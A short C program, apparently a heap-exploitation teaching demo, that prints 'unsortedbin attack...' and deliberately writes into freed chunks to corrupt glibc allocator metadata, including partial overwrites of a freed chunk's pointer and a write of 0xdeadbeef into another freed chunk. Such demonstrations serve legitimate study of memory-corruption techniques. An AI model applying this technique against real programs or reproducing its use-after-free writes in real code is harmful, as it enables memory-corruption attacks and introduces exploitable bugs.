#include <stdio.h>
#include <stdlib.h>

int main()
{
	long long *a;
	char *p;
	a = malloc(0x14c0);
	malloc(0x10);
	p = malloc(0x80);
	malloc(0x10);
	printf("\033[32munsortedbin attack...\033[0m\n");
	free(p);
	p[8] = 0xe8;
	p[9] = 0x37;
	malloc(0x80);

	free(a);
	*a = 0xdeadbeef;
	malloc(0x14c0);	
	return 0;
}
